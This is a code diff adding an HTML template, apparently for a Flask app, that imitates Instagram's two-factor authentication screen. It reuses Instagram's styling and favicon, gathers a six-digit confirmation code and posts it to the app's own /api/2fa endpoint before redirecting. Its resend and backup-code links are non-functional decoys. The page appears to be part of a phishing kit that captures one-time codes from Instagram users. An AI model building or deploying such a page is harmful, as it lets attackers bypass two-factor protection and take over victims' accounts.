@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram • Two-Factor Authentication</title>
+    <link rel="icon" href="https://www.instagram.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <style>
+        body {
+            background: #fafafa;
+        }
+        .twofa-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .twofa-box {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 40px;
+            text-align: center;
+        }
+        .twofa-icon {
+            font-size: 80px;
+            margin-bottom: 15px;
+        }
+        .twofa-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 10px;
+        }
+        .twofa-desc {
+            font-size: 13px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin: 20px 0;
+        }
+        .code-input {
+            width: 44px;
+            height: 50px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+            border: 2px solid #dbdbdb;
+            border-radius: 6px;
+            outline: none;
+            background: #fafafa;
+            color: #262626;
+            transition: all 0.2s ease;
+        }
+        .code-input:focus {
+            border-color: #0095f6;
+            box-shadow: 0 0 0 2px rgba(0, 149, 246, 0.1);
+        }
+        .code-input.filled {
+            border-color: #a8a8a8;
+        }
+        .twofa-btn {
+            width: 100%;
+            padding: 7px 16px;
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: all 0.2s ease;
+        }
+        .twofa-btn:hover:not(:disabled) {
+            background: #1877f2;
+        }
+        .twofa-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .twofa-error {
+            background: rgba(237, 73, 86, 0.05);
+            border: 1px solid rgba(237, 73, 86, 0.2);
+            color: #ed4956;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .twofa-resend {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #8e8e8e;
+        }
+        .twofa-resend a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .twofa-backup {
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 1px solid #dbdbdb;
+        }
+        .twofa-backup a {
+            color: #262626;
+            font-size: 13px;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .twofa-loader {
+            display: none;
+            text-align: center;
+            padding: 10px 0;
+        }
+        .twofa-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #dbdbdb;
+            border-top-color: #262626;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    
+    <div class="twofa-wrapper">
+        <div class="twofa-box">
+            <div class="twofa-icon">🔐</div>
+            <div class="twofa-title">Enter Confirmation Code</div>
+            <div class="twofa-desc" id="twofa-message">
+                Enter the confirmation code we sent to your device.
+            </div>
+            
+            <div id="twofa-error" class="twofa-error"></div>
+            
+            <form id="twofa-form" method="POST" action="/api/2fa">
+                <div class="code-inputs">
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                    <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" required>
+                </div>
+                
+                <button type="submit" id="twofa-submit" class="twofa-btn">Confirm</button>
+            </form>
+            
+            <div id="twofa-loader" class="twofa-loader">
+                <div class="twofa-spinner"></div>
+            </div>
+            
+            <div class="twofa-resend">
+                <a href="#" id="resend-code" onclick="return false;">Resend Code</a>
+            </div>
+            
+            <div class="twofa-backup">
+                <a href="#" onclick="return false;">Use Backup Code</a>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Initialize 2FA form with code inputs
+        document.addEventListener('DOMContentLoaded', function() {
+            const codeInputs = document.querySelectorAll('.code-input');
+            const twofaForm = document.getElementById('twofa-form');
+            const errorDiv = document.getElementById('twofa-error');
+            const submitBtn = document.getElementById('twofa-submit');
+            const loaderDiv = document.getElementById('twofa-loader');
+            
+            // Auto-focus first input
+            if (codeInputs.length > 0) {
+                codeInputs[0].focus();
+            }
+            
+            // Handle individual code inputs
+            codeInputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    const value = this.value.replace(/[^0-9]/g, '');
+                    this.value = value;
+                    
+                    if (value.length === 1 && index < codeInputs.length - 1) {
+                        codeInputs[index + 1].focus();
+                    }
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
+                        codeInputs[index - 1].focus();
+                    }
+                });
+                
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pasted = (e.clipboardData || window.clipboardData).getData('text');
+                    const numbers = pasted.replace(/[^0-9]/g, '').split('');
+                    
+                    numbers.forEach((num, i) => {
+                        if (codeInputs[index + i]) {
+                            codeInputs[index + i].value = num;
+                        }
+                    });
+                    
+                    const lastIdx = Math.min(index + numbers.length, codeInputs.length - 1);
+                    codeInputs[lastIdx].focus();
+                });
+            });
+            
+            // Form submission
+            twofaForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                let code = '';
+                codeInputs.forEach(input => {
+                    code += input.value;
+                });
+                
+                if (code.length < 6) {
+                    showError('Please enter the complete 6-digit code.');
+                    return;
+                }
+                
+                // Show loading
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Verifying...';
+                loaderDiv.style.display = 'block';
+                errorDiv.style.display = 'none';
+                
+                fetch('/api/2fa', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify({ code: code })
+                })
+                .then(res => res.json())
+                .then(data => {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Confirm';
+                    loaderDiv.style.display = 'none';
+                    
+                    if (data.status === 'success') {
+                        if (data.redirect) {
+                            window.location.href = data.redirect;
+                        }
+                    } else {
+                        showError(data.message || 'Invalid code. Please try again.');
+                        codeInputs.forEach(input => { input.value = ''; });
+                        codeInputs[0].focus();
+                        twofaForm.classList.add('shake');
+                        setTimeout(() => twofaForm.classList.remove('shake'), 600);
+                    }
+                })
+                .catch(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = 'Confirm';
+                    loaderDiv.style.display = 'none';
+                    showError('Connection error. Please try again.');
+                });
+            });
+            
+            function showError(message) {
+                errorDiv.textContent = message;
+                errorDiv.style.display = 'block';
+                setTimeout(() => { errorDiv.style.display = 'none'; }, 5000);
+            }
+            
+            // Resend timer
+            const resendBtn = document.getElementById('resend-code');
+            if (resendBtn) {
+                let timeLeft = 30;
+                resendBtn.style.color = '#8e8e8e';
+                resendBtn.style.fontWeight = '400';
+                
+                const timer = setInterval(() => {
+                    timeLeft--;
+                    resendBtn.textContent = `Resend Code (${timeLeft}s)`;
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(timer);
+                        resendBtn.textContent = 'Resend Code';
+                        resendBtn.style.color = '#0095f6';
+                        resendBtn.style.fontWeight = '600';
+                        resendBtn.style.cursor = 'pointer';
+                    }
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
